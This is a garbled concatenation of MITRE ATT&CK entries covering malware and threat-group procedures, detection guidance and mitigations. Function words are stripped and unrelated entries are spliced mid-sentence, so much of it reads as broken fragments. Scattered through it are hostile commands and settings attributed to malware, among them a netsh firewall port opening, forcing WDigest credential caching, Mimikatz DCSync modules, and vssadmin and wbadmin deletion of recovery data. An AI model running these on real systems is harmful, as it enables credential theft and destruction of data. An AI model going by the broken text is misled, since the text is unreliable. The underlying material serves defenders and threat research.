2017) [BONDUPDATER](https://attack.mitre.org/software/S0360) persists scheduled task executes minute.(Citation: Palo Alto OilRig Sep 2018) [APT32](https://attack.mitre.org/groups/G0050) malware rundll32.exe execute initial infection process.(Citation: Cybereason Cobalt Kitty 2017) Monitor modifications PATH environment variable Registry <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path</code>. adversary add directory list directories locations programs executed from. [Rancor](https://attack.mitre.org/groups/G0075) downloaded additional malware, including [certutil](https://attack.mitre.org/software/S0160).(Citation: Rancor Unit42 June 2018) Windows 10, enable Attack Surface Reduction (ASR) rules block unsigned/untrusted executable files (such .exe, .dll, .scr) running USB removable drives. (Citation: win10_asr) [USBferry](https://attack.mitre.org/software/S0452) detect infected machine's network topology <code>ipconfig</code> <code>arp</code>.(Citation: TrendMicro Tropic Trooper 2020)	 [C0015](https://attack.mitre.org/campaigns/C0015), threat actors DLL named `D8B3.dll` injected Winlogon process.(Citation: DFIR Conti Bazar Nov 2021)  [HARDRAIN](https://attack.mitre.org/software/S0246) command <code>cmd.exe /c netsh firewall add portopening TCP 443 "adp"</code> victim machine function proxy server.(Citation: US-CERT HARDRAIN March 2018) [PipeMon](https://attack.mitre.org/software/S0501) installer modified Registry key <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors</code> install [PipeMon](https://attack.mitre.org/software/S0501) Print Processor.(Citation: ESET PipeMon 2020) [JPIN](https://attack.mitre.org/software/S0201) download files upgrade itself.(Citation: PLATINUM April 2016) [Chimera](https://attack.mitre.org/groups/G0114) renamed malware GoogleUpdate.exe WinRAR jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, msadcs1.exe.(Citation: Cycraft Chimera April 2020) Correlate security systems login user active login session entered building VPN access). Detection Endpoint DoS achieved sufficient impact availability service, response time typically requires aggressive monitoring responsiveness. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) (Citation: NCC TA505) [YAHOYAH](https://attack.mitre.org/software/S0388) decrypts downloaded files execution.(Citation: TrendMicro TropicTrooper 2015) multi-factor authentication user privileged accounts. [FIN6](https://attack.mitre.org/groups/G0037) tools exploit Windows vulnerabilities escalate privileges. tools targeted CVE-2013-3660, CVE-2011-2005, CVE-2010-4398, local users access kernel-level privileges.(Citation: FireEye FIN6 April 2016) [T9000](https://attack.mitre.org/software/S0098) performs checks antivirus security products installation.(Citation: Palo Alto T9000 Feb 2016) [QakBot](https://attack.mitre.org/software/S0650) <code>net config workstation</code>, <code>arp -a</code>, <code>ipconfig /all</code> gather network configuration information.(Citation: Crowdstrike Qakbot October 2020)(Citation: Kaspersky QakBot September 2021)(Citation: IB Ransomware September 2020) [Gold Dragon](https://attack.mitre.org/software/S0249) stores gathered endpoint file named 1.hwp.(Citation: McAfee Gold Dragon) [FunnyDream](https://attack.mitre.org/software/S1044) collect hosts victim network.(Citation: Kaspersky APT Trends Q1 2020) [HotCroissant](https://attack.mitre.org/software/S0431) source UPX executable packer.(Citation: Carbon Black HotCroissant April 2020) [Dark Caracal](https://attack.mitre.org/groups/G0070)'s version [Bandook](https://attack.mitre.org/software/S0234) adds registry key <code>HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run</code> persistence.(Citation: Lookout Dark Caracal Jan 2018) [Higaisa](https://attack.mitre.org/groups/G0126) FakeTLS session C2 communications.(Citation: Zscaler Higaisa 2020) [OSInfo](https://attack.mitre.org/software/S0165) discovers infected machine.(Citation: Symantec Buckeye) [UBoatRAT](https://attack.mitre.org/software/S0333) checks virtualization software VMWare, VirtualBox, QEmu compromised machine.(Citation: PaloAlto UBoatRAT Nov 2017) [Gold Dragon](https://attack.mitre.org/software/S0249) establishes persistence Startup folder.(Citation: McAfee Gold Dragon) logging historical data remote data store centralized logging solution preserve historical command log data. [ThiefQuest](https://attack.mitre.org/software/S0595) prepends executable file maintaining executable.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis) Limit user access utilities 'systemctl' users legitimate need. (Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [FinFisher](https://attack.mitre.org/software/S0182) variants incorporate MBR rootkit.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [Kazuar](https://attack.mitre.org/software/S0265) internal nodes compromised network C2 communications.(Citation: Accenture HyperStack October 2020) [IceApple](https://attack.mitre.org/software/S1022) Base64-encoded AES key decrypt tasking.(Citation: CrowdStrike IceApple 2022) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) gather process information.(Citation: SentinelOne Aoqin Dragon June 2022) [TINYTYPHON](https://attack.mitre.org/software/S0131) installs Registry key establish persistence.(Citation: Forcepoint Monsoon) Monitor cluster-level (Kubernetes) data events changing containers' volume configurations. [Caterpillar WebShell](https://attack.mitre.org/software/S0572) list services system.(Citation: ClearSky Lebanese Cedar Jan 2021)  [Lokibot](https://attack.mitre.org/software/S0447) embedded commands <code>schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</code> batch script.(Citation: Talos Lokibot Jan 2021)  [PlugX](https://attack.mitre.org/software/S0013) service establish persistence. [PlugX](https://attack.mitre.org/software/S0013) module change service configurations start, control, delete services.(Citation: CIRCL PlugX March 2013)(Citation: Lastline PlugX Analysis)(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017)(Citation: Proofpoint ZeroT Feb 2017) [ObliqueRAT](https://attack.mitre.org/software/S0644) gained execution targeted systems luring users links malicious URLs.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe 2021) [Bad Rabbit](https://attack.mitre.org/software/S0606) EternalRomance SMB exploit spread victim networks.(Citation: Secure List Bad Rabbit) [UNC2452](https://attack.mitre.org/groups/G0118) encoded PowerShell commands.(Citation: - Customer Guidance Nation-State Cyber Attacks) [zwShell](https://attack.mitre.org/software/S0350) victim IP address.(Citation: McAfee Night Dragon) [Shamoon](https://attack.mitre.org/software/S0140) impersonate tokens <code>LogonUser</code>, <code>ImpersonateLoggedOnUser</code>, <code>ImpersonateNamedPipeClient</code>.(Citation: McAfee Shamoon December 2018) [BBK](https://attack.mitre.org/software/S0470) ability decrypt AES encrypted payloads.(Citation: Trend Micro Tick November 2019) [KillDisk](https://attack.mitre.org/software/S0607) loads executes functions DLL.(Citation: Trend Micro KillDisk 1) [Calisto](https://attack.mitre.org/software/S0274) input prompt user's login password.(Citation: Symantec Calisto July 2018) Ensure alerts Protected View enabled.(Citation: Protected View) Monitor newly constructed files modify kernel automatically execute programs boot. Users trained identify social engineering techniques spearphishing attempts. [Ramsay](https://attack.mitre.org/software/S0458) compress archive collected files WinRAR.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020) [Cardinal RAT](https://attack.mitre.org/software/S0348) lures victims executing malicious macros embedded Excel documents.(Citation: PaloAlto CardinalRat Apr 2017) (Citation: Proofpoint TA505 Jan 2019)(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019)(Citation: Trend Micro TA505 June 2019) (Citation: FireEye FIN7 March 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: DOJ FIN7 Aug 2018)(Citation: IBM Ransomware Trends September 2020)(Citation: CrowdStrike Carbon Spider August 2021)(Citation: FBI Flash FIN7 USB) Monitor hash dumpers Security Accounts Manager (SAM) local file (<code>%SystemRoot%/system32/config/SAM</code>). hash dumpers local file device parse SAM table avoid file access defenses. in-memory SAM table reading hashes. Detection compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use adversaries well. [APT1](https://attack.mitre.org/groups/G0006) utilities, GETMAIL MAPIGET, steal email. GETMAIL extracts emails archived Outlook .pst files.(Citation: Mandiant APT1) [APT29](https://attack.mitre.org/groups/G0016) WinRM PowerShell execute command payloads remote hosts.(Citation: Symantec RAINDROP January 2021) [PowGoop](https://attack.mitre.org/software/S1046) disguised PowerShell script .dat file (goopdate.dat).(Citation: DHS CISA AA22-055A MuddyWater February 2022) Anti-virus automatically quarantine suspicious files.  [Skidmap](https://attack.mitre.org/software/S0468) kernel-mode rootkit ability hook calls hide specific files fake network CPU-related statistics CPU load infected machine low.(Citation: Trend Micro Skidmap) Monitor process viewed inject dynamic-link libraries (DLLs) processes evade process-based defenses elevate privileges. [Sandworm Team](https://attack.mitre.org/groups/G0034) port 6789 accept connections group's SSH server.(Citation: ESET BlackEnergy Jan 2016) [SysUpdate](https://attack.mitre.org/software/S0663) ability download files compromised host.(Citation: Trend Micro Iron Tiger April 2021) [Octopus](https://attack.mitre.org/software/S0340) collect drive information, name, size disk, OS version, OS architecture information.(Citation: Securelist Octopus Oct 2018) Ensure containers running root default. Kubernetes environments, defining Pod Security Policy prevents pods running privileged containers.(Citation: Kubernetes Hardening Guide) [Bazar](https://attack.mitre.org/software/S0534) query <code>Windows\CurrentVersion\Uninstall</code> installed applications.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors executed encoded VBScript file.(Citation: Cybereason OperationCuckooBees 2022) running <code>root</code> permissions, [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) create persistence file folder <code>/Library/LaunchDaemons</code>.(Citation: TrendMicro MacOS April 2018)(Citation: sentinelone apt32 macOS backdoor 2020) [Attor](https://attack.mitre.org/software/S0438)'s plugin captures screenshots target applications.(Citation: ESET Attor Oct 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) `GetRegValue` function check Registry `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` `HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`. additional modules check software AutoRun values Win32 namespace values HKCU, HKLM, HKCR, HKCC hives.(Citation: GitHub SILENTTRINITY Modules July 2019) [FELIXROOT](https://attack.mitre.org/software/S0267) collects network including IP address DHCP server.(Citation: ESET GreyEnergy Oct 2018) [TA505](https://attack.mitre.org/groups/G0092) staged malware actor-controlled domains.(Citation: Korean FSI TA505 2020) [Kessel](https://attack.mitre.org/software/S0487) proxy exfiltration set configuration.(Citation: ESET ForSSHe December 2018) [FIN10](https://attack.mitre.org/groups/G0051) established persistence Registry option PowerShell Empire add key.(Citation: FireEye FIN10 June 2017)(Citation: Github PowerShell Empire) [APT12](https://attack.mitre.org/groups/G0005) exploited multiple vulnerabilities execution, including Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) vulnerabilities Adobe Reader Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).(Citation: Moran 2014)(Citation: Trend Micro IXESHE 2012) [Agent Tesla](https://attack.mitre.org/software/S0331) <code>ProcessWindowStyle.Hidden</code> hide windows.(Citation: Malwarebytes Agent Tesla April 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) SSH remote service.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Cobalt Strike Manual 4.3 November 2020) (Citation: Dell TG-3390)(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Nccgroup Emissary Panda 2018)(Citation: Trend Micro Iron Tiger April 2021) [KillDisk](https://attack.mitre.org/software/S0607) called <code>GetCurrentProcess</code>.(Citation: Trend Micro KillDisk 2) [Empire](https://attack.mitre.org/software/S0363) includes modules finding files hosts network shares.(Citation: Github PowerShell Empire) (Citation: FireEye APT28 January 2017)(Citation: Kaspersky Sofacy)(Citation: Securelist Sofacy Feb 2018)(Citation: District Court Indictment GRU Oct 2018)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Pupy](https://attack.mitre.org/software/S0192) walk directories recursively search strings files.(Citation: GitHub Pupy) [BLINDINGCAN](https://attack.mitre.org/software/S0520) packed UPX packer.(Citation: US-CERT BLINDINGCAN Aug 2020) Monitor executed commands arguments establish persistence elevate privileges executing malicious content triggered accessibility features. Command invocation tools capable modifying Registry suspicious. Utility arguments binaries monitored changes. [BoxCaon](https://attack.mitre.org/software/S0651) upload files compromised host.(Citation: Checkpoint IndigoZebra July 2021) [SoreFang](https://attack.mitre.org/software/S0516) collect hostname, operating configuration, product ID, disk space victim machines executing [Systeminfo](https://attack.mitre.org/software/S0096).(Citation: CISA SoreFang July 2016) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Wizard Spider](https://attack.mitre.org/groups/G0102) modified Registry key <code>HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest</code> setting <code>UseLogonCredential</code> registry <code>1</code> force credentials stored memory.(Citation: CrowdStrike Grim Spider 2019) [Gelsemium](https://attack.mitre.org/software/S0666) retrieve data specific Windows directories, random files [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497).(Citation: ESET Gelsemium June 2021) [Seasalt](https://attack.mitre.org/software/S0345) command download additional files.(Citation: Mandiant APT1 Appendix)(Citation: Mandiant APT1 Appendix) Commands <code>net group</code> <code>net localgroup</code> [Net](https://attack.mitre.org/software/S0039) gather manipulate groups.(Citation: Savill 1999) [DarkComet](https://attack.mitre.org/software/S0334) load files infected machine execute.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [PoshC2](https://attack.mitre.org/software/S0378) modules, <code>Get-LocAdm</code> enumerating permission groups.(Citation: GitHub PoshC2) [TA459](https://attack.mitre.org/groups/G0062) targeted victims spearphishing emails malicious Word attachments.(Citation: Proofpoint TA459 April 2017) [Mimikatz](https://attack.mitre.org/software/S0002)’s <code>LSADUMP::DCSync</code> <code>KERBEROS::PTT</code> modules implement steps required extract krbtgt account hash create/use Kerberos tickets.(Citation: Adsecurity Mimikatz Guide)(Citation: AdSecurity Kerberos Aug 2015)(Citation: Harmj0y DCSync Sept 2015)(Citation: NCSC Joint Report Public Tools) [APT28](https://attack.mitre.org/groups/G0007) legitimate credentials gain initial access, maintain access, exfiltrate data victim network. credentials stolen spearphishing email login DCCC network. leveraged default manufacturer's passwords gain initial access corporate networks IoT devices VOIP phone, printer, video decoder.(Citation: Trend Micro Pawn Storm April 2017)(Citation: DOJ GRU Indictment Jul 2018)(Citation: STRONTIUM Aug 2019)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [FALLCHILL](https://attack.mitre.org/software/S0181) collects MAC address local IP address victim.(Citation: US-CERT FALLCHILL Nov 2017) [MoonWind](https://attack.mitre.org/software/S0149) delete files.(Citation: Palo Alto MoonWind March 2017) [Epic](https://attack.mitre.org/software/S0091) compresses collected data bzip2 sending C2 server.(Citation: Kaspersky Turla Aug 2014) (Citation: Moran 2013)(Citation: Moran 2014) [SeaDuke](https://attack.mitre.org/software/S0053) samples module extract email Exchange servers compromised credentials.(Citation: Symantec Seaduke 2015) (Citation: Mandiant APT1) (Citation: ESET Turla PowerShell 2019) [Metamorfo](https://attack.mitre.org/software/S0455) mshta.exe execute HTA payload.(Citation: FireEye Metamorfo Apr 2018)  [CrackMapExec](https://attack.mitre.org/software/S0488) dump hashed passwords LSA secrets targeted system.(Citation: CME Github September 2018) [LAPSUS$](https://attack.mitre.org/groups/G1004) set Office 365 tenant level mail transport rule send mail targeted organization newly created account.(Citation: MSTIC DEV-0537 Mar 2022) (Citation: Lotus Blossom Dec 2015)(Citation: Emissary Trojan Feb 2016) Monitor HKLM\Software\Policies\Microsoft\Windows NT\DNSClient "EnableMulticast" DWORD value. "0" LLMNR disabled. Monitor newly constructed network connections [Valid Accounts](https://attack.mitre.org/techniques/T1078) log service designed accept remote connections, RDP, telnet, SSH, VNC. Monitor network connections involving common remote management protocols, ports tcp:3283 tcp:5900, ports tcp: 3389 tcp:22 remote login. [Umbreon](https://attack.mitre.org/software/S0221) hides defenders hooking libc function calls, hiding artifacts reveal presence, user account creates provide access undermining strace, tool identify malware.(Citation: Umbreon Trend Micro) [Revenge RAT](https://attack.mitre.org/software/S0379) communicated TCP port 3333.(Citation: Cylance Shaheen Nov 2018) Monitor newly constructed logon behavior default accounts activated logged into. audits include checks appliances applications default credentials SSH keys, discovered, updated immediately. Network intrusion prevention systems systems designed scan remove malicious email attachments links block activity. [CHOPSTICK](https://attack.mitre.org/software/S0023) checks antivirus forensics software.(Citation: FireEye APT28) [Winnti Linux](https://attack.mitre.org/software/S0430) passive listener, capable identifying specific magic executing tasking, secondary command control (C2) mechanism.(Citation: Chronicle Winnti Linux 2019) [JSS Loader](https://attack.mitre.org/software/S0648) download execute JavaScript files.(Citation: CrowdStrike Carbon Spider August 2021) [Whitefly](https://attack.mitre.org/groups/G0107) open-source tool exploit Windows privilege escalation vulnerability (CVE-2016-0051) unpatched computers.(Citation: Symantec Whitefly March 2019)	 Ensure local administrator accounts complex, unique passwords systems network. [Aria-body](https://attack.mitre.org/software/S0456) established persistence Startup folder Registry key.(Citation: CheckPoint Naikon 2020) [Aoqin Dragon](https://attack.mitre.org/groups/G1007) scripts identify file formats including Word.(Citation: SentinelOne Aoqin Dragon June 2022) [Mustang Panda](https://attack.mitre.org/groups/G0129) encrypted documents RC4 prior exfiltration.(Citation: Avira Mustang Panda January 2020) [APT32](https://attack.mitre.org/groups/G0050) scriptlets download Cobalt Strike beacons.(Citation: Cybereason Cobalt Kitty 2017)	 [ZxShell](https://attack.mitre.org/software/S0412) command event logs.(Citation: Talos ZxShell Oct 2014)  [Heyoka Backdoor](https://attack.mitre.org/software/S1027) rundll32.exe gain execution.(Citation: SentinelOne Aoqin Dragon June 2022) [MCMD](https://attack.mitre.org/software/S0500) HTTPS communication C2 servers.(Citation: Secureworks MCMD July 2019) [AuTo Stealer](https://attack.mitre.org/software/S1029) collect data PowerPoint files, Word documents, Excel files, PDF files, files, database files, image files infected machine.(Citation: MalwareBytes SideCopy Dec 2021) [Dragonfly](https://attack.mitre.org/groups/G0035) command execution.(Citation: US-CERT TA18-074A) [Ramsay](https://attack.mitre.org/software/S0458) embedded documents exploiting CVE-2017-0199, CVE-2017-11882, CVE-2017-8570.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020) [Machete](https://attack.mitre.org/software/S0409) sends stolen data C2 server minutes.(Citation: ESET Machete July 2019)  [Astaroth](https://attack.mitre.org/software/S0373) exfiltrates collected r1.log file external C2 server. (Citation: Cybereason Astaroth Feb 2019) (Citation: FireEye Enemy FIN8 Aug 2016) [HAFNIUM](https://attack.mitre.org/groups/G0125) collected e-mail addresses users intended target.(Citation: Volexity Exchange Marauder March 2021) Monitor newly constructed network connections received untrusted hosts.  Monitor third-party application logging, messaging, artifacts leverage SharePoint repository source valuable information. Monitor access SharePoint repositories performed privileged users (for example, Active Directory Domain, Enterprise, Schema Administrators) closely monitored alerted upon, types accounts access repositories. capability exists, monitor alert users retrieving viewing documents pages; behavior indicative programmatic retrieve data repository. environments high-maturity, leverage User-Behavioral Analytics (UBA) platforms detect alert user based anomalies. Monitor executed commands arguments modify XDG autostart entries execute programs commands boot. [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers start remote shell.(Citation: Symantec Linfo 2012) [WannaCry](https://attack.mitre.org/software/S0366) <code>vssadmin</code>, <code>wbadmin</code>, <code>bcdedit</code>, <code>wmic</code> delete disable operating recovery features.(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017)(Citation: SecureWorks WannaCry Analysis) [APT32](https://attack.mitre.org/groups/G0050)'s backdoor modified Windows Registry store backdoor's configuration. (Citation: ESET OceanLotus Mar 2019)	
 Monitor files unexpected modifications RC scripts /etc/ directory [SDBbot](https://attack.mitre.org/software/S0461) ability access file compromised host.(Citation: Proofpoint TA505 October 2019) [TrickBot](https://attack.mitre.org/software/S0266) collects users system.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Trickbot Nov 2018) [ELMER](https://attack.mitre.org/software/S0064) command control.(Citation: FireEye EPS Awakens 2) [WhisperGate](https://attack.mitre.org/software/S0689) overwrite Master Book Record (MBR) victim systems malicious 16-bit bootloader.(Citation: WhisperGate January 2022)(Citation: Crowdstrike WhisperGate January 2022)(Citation: Cybereason WhisperGate February 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [NotPetya](https://attack.mitre.org/software/S0368) <code>wmic</code> propagate network.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017) [APT32](https://attack.mitre.org/groups/G0050) email C2 Office macro.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) [Magic Hound](https://attack.mitre.org/groups/G0059) acquired personal email addresses individuals intend target.(Citation: Proofpoint TA453 July2021) [HEXANE](https://attack.mitre.org/groups/G1001) password spraying attacks valid credentials.(Citation: SecureWorks August 2019) [Lokibot](https://attack.mitre.org/software/S0447) performed time-based anti-debug check downloading stage.(Citation: Talos Lokibot Jan 2021) [TEMP.Veles](https://attack.mitre.org/groups/G0088) utilized RDP operation.(Citation: FireEye TRITON 2019)	 (Citation: McAfee Honeybee)  [TEMP.Veles](https://attack.mitre.org/groups/G0088) port-protocol mismatches ports 443, 4444, 8531, 50501 C2.(Citation: FireEye TRITON 2019) [MuddyWater](https://attack.mitre.org/groups/G0069) C2 communications.(Citation: ClearSky MuddyWater June 2019)(Citation: Trend Micro Muddy Water March 2021) [Crimson](https://attack.mitre.org/software/S0115) perform audio surveillance microphones.(Citation: Kaspersky Transparent Tribe August 2020) [NotPetya](https://attack.mitre.org/software/S0368) exploits SMBv1, EternalBlue EternalRomance, spread remote systems network.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: District Court Indictment GRU Unit 74455 October 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Monitor client software correlate software patch cycles. [ELMER](https://attack.mitre.org/software/S0064) capable performing process listings.(Citation: FireEye EPS Awakens 2) Monitor unexpected deletion file manipulate external outcomes hide activity  [PowerStallion](https://attack.mitre.org/software/S0393) monitor process lists.(Citation: ESET Turla PowerShell 2019) [APT32](https://attack.mitre.org/groups/G0050)'s backdoor LZMA compression RC4 encryption exfiltration.(Citation: ESET OceanLotus Mar 2019) [Proxysvc](https://attack.mitre.org/software/S0238) lists files directories.(Citation: McAfee GhostSecret) [Kerrdown](https://attack.mitre.org/software/S0585) ability determine compromised host running 32 64 bit OS architecture.(Citation: Unit 42 KerrDown February 2019) [ShimRatReporter](https://attack.mitre.org/software/S0445) spoofed <code>AlphaZawgyl_font.exe</code>, specialized Unicode font.(Citation: FOX-IT 2016 Mofang) application control appropriate, execution tools organization's security policies (such rootkit removal tools) abused impair defenses. Ensure approved security applications running enterprise systems. [Conti](https://attack.mitre.org/software/S0575) retrieve ARP cache local <code>GetIpNetTable()</code> API check ensure IP addresses connects local, non-Internet, systems.(Citation: CarbonBlack Conti July 2020)  [Torisma](https://attack.mitre.org/software/S0678) encrypted C2 communications XOR VEST-32.(Citation: McAfee Lazarus Nov 2020) [Kobalos](https://attack.mitre.org/software/S0641) write captured SSH connection credentials file <code>/var/run</code> directory <code>.pid</code> extension exfiltration.(Citation: ESET Kobalos Jan 2021)  (Citation: ESET Gazer Aug 2017) [BoomBox](https://attack.mitre.org/software/S0635) enumerate hostname, domain, IP compromised host.(Citation: MSTIC Nobelium Toolset 2021) Monitor authentication logs application login failures [Valid Accounts](https://attack.mitre.org/techniques/T1078). authentication failures high, brute force attempt gain access legitimate credentials. (Citation: Symantec Elderwood Sept 2012) Restrict unallowed ISAPI extensions filters running list ISAPI extensions filters IIS.(Citation: ISAPICGIRestriction 2016) [LoudMiner](https://attack.mitre.org/software/S0451) harvested resources cryptocurrency, XMRig Monero.(Citation: ESET LoudMiner June 2019)	 Monitor applications processes remote admin tools. Correlate activity suspicious behavior reduce false positives tools legitimate users administrators. [Domain Fronting](https://attack.mitre.org/techniques/T1090/004) conjunction avoid defenses. Adversaries deploy install remote tools compromised systems. detect prevent installation tools host-based solutions. [WhisperGate](https://attack.mitre.org/software/S0689) overwrite sectors victim host's hard drive periodic offsets.(Citation: Crowdstrike WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) Identify files <code>com.apple.ResourceFork</code> extended attribute data amounts stored resource forks. Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. (Citation: Unit 42 Kazuar 2017)(Citation: Talos TinyTurla September 2021) vendors provide digitally signed operating images validate integrity software platform.  feature prevent detect attempts adversaries compromise image. (Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS) Monitor unexpected access passwords hashes stored memory, processes maps file /proc filesystem process analyzed. file stored path <code>/proc/\/maps</code>, <code>\</code> directory unique pid program interrogated authentication data. AuditD monitoring tool, ships stock Linux distributions, watch hostile processes file proc file system, alerting pid, process name, arguments programs. [Olympic Destroyer](https://attack.mitre.org/software/S0365) overwrites files locally remote shares.(Citation: Talos Olympic Destroyer 2018)(Citation: District Court Indictment GRU Unit 74455 October 2020)  Monitor newly constructed processes command-lines non-native binary formats cross-platform compiler execution frameworks Mono determine legitimate purpose system. Typically specific limited cases, software development. (Citation: Bitdefender FunnyDream Campaign November 2020) Monitor executed commands arguments details network configuration settings, IP MAC addresses, systems access discovery remote systems. network devices, monitor executed commands AAA logs, unexpected unauthorized users. [Nebulae](https://attack.mitre.org/software/S0630) ability <code>CreateProcess</code> execute process.(Citation: Bitdefender Naikon April 2021) [Chimera](https://attack.mitre.org/groups/G0114) copied tools compromised hosts SMB.(Citation: NCC Chimera January 2021) [Silence](https://attack.mitre.org/groups/G0091) capture victim screen activity.(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Sept 2018) Monitor events scripting execution, process activity, usage Windows Script Host (typically cscript.exe wscript.exe), file activity involving scripts monitoring social media activity organization. Suspicious activity include personas claiming organization modified accounts numerous connection requests accounts affiliated organization.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)). Monitor executed commands arguments employ detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. Integrating multi-factor authentication (MFA) organizational policy greatly reduce risk adversary gaining control valid credentials additional tactics initial access, lateral movement, collecting information. MFA restrict access cloud resources APIs.  [Mustang Panda](https://attack.mitre.org/groups/G0129) delete tools files, kill processes objectives reached.(Citation: Secureworks BRONZE PRESIDENT December 2019) [Magic Hound](https://attack.mitre.org/groups/G0059) attempted lure victims malicious links embedded emails.(Citation: ClearSky Kittens 3 August 2020)(Citation: Certfa Charming Kitten January 2021) Monitor executed commands arguments attempt hide artifacts behaviors evade detection. [TYPEFRAME](https://attack.mitre.org/software/S0263) variant decrypts archive RC4 key, decompresses installs decrypted malicious DLL module. variant decodes embedded file XORing "0x35".(Citation: US-CERT TYPEFRAME June 2018) [Ebury](https://attack.mitre.org/software/S0377) encrypted C2 traffic client IP address, encoded hexadecimal string.(Citation: ESET Ebury Feb 2014) [Kazuar](https://attack.mitre.org/software/S0265) gathers local members.(Citation: Unit 42 Kazuar 2017) [MuddyWater](https://attack.mitre.org/groups/G0069) PowerShell backdoor check Skype connectivity target machine.(Citation: Trend Micro Muddy Water March 2021) Require multi-factor authentication SSH connections possible, password protected SSH keys. [MoonWind](https://attack.mitre.org/software/S0149) obtains victim's current time.(Citation: Palo Alto MoonWind March 2017) [APT38](https://attack.mitre.org/groups/G0082) custom secure delete function deleted files unrecoverable.(Citation: FireEye APT38 Oct 2018) [Bankshot](https://attack.mitre.org/software/S0239) searches Registry configured executing payload.(Citation: US-CERT Bankshot Dec 2017) (Citation: NCC TA505) [PoetRAT](https://attack.mitre.org/software/S0428) ability gather compromised host.(Citation: Talos PoetRAT April 2020) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. [Tropic Trooper](https://attack.mitre.org/groups/G0081) side-load DLLs valid version Windows Address Book Windows Defender executable tools.(Citation: CitizenLab KeyBoy Nov 2016)(Citation: Anomali Pirate Panda April 2020) [QuasarRAT](https://attack.mitre.org/software/S0262) retrieve files compromised client machines.(Citation: CISA AR18-352A Quasar RAT December 2018) [APT39](https://attack.mitre.org/groups/G0087) spearphishing emails attempt lure users malicious link.(Citation: FireEye APT39 Jan 2019)(Citation: FBI FLASH APT39 September 2020) [HALFBAKED](https://attack.mitre.org/software/S0151) WMI queries gather information.(Citation: FireEye FIN7 April 2017) [Ke3chang](https://attack.mitre.org/groups/G0004) tools [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: NCC APT15 Alive Strong) (Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) [Comnie](https://attack.mitre.org/software/S0244) runs <code>net view</code> command [MacMa](https://attack.mitre.org/software/S1016) macOS API functions perform tasks.(Citation: ESET DazzleSpy Jan 2022)(Citation: Objective-See MacMa Nov 2021) [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping account password gaining access additional systems enterprise network resources. functionality acquire credentials ways, including DPAPI.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Oct 2015)(Citation: NCSC Joint Report Public Tools)	 [Kimsuky](https://attack.mitre.org/groups/G0094) compromised email accounts send spearphishing e-mails.(Citation: VirusBulletin Kimsuky October 2019)(Citation: Malwarebytes Kimsuky June 2021) [Earth Lusca](https://attack.mitre.org/groups/G1006) malicious payload `%WINDIR%\SYSTEM32\oci.dll` sideloaded 